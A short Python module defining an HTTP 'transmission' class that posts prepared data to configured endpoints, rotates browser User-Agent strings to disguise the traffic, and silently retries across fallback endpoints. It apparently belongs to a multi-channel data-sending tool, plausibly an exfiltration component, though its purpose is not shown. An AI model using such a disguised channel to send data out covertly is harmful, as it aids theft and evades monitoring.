"""
HTTP Transmission Module
Sends data via HTTP POST requests
"""

import requests
import random
import logging
from .base import BaseTransmission
from config import Config

class HTTPTransmission(BaseTransmission):
    def __init__(self):
        super().__init__()
        self.endpoints = Config.HTTP_CONFIG['endpoints']
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81'
        ]
        
        self.method_name = "HTTP"
    
    def send(self, data):
        """Send data via HTTP"""
        try:
            prepared = self.prepare_data(data)
            
            # Randomize user agent
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            # Try each endpoint
            for endpoint in self.endpoints:
                try:
                    response = requests.post(
                        endpoint,
                        data={'data': prepared},
                        headers=headers,
                        timeout=self.timeout
                    )
                    
                    if response.status_code == 200:
                        self.log_attempt(True, len(data))
                        return True
                except:
                    continue
            
            self.log_attempt(False, 0)
            return False
            
        except Exception as e:
            self.log_attempt(False, 0)
            logging.error(f"HTTP send failed: {e}")
            return False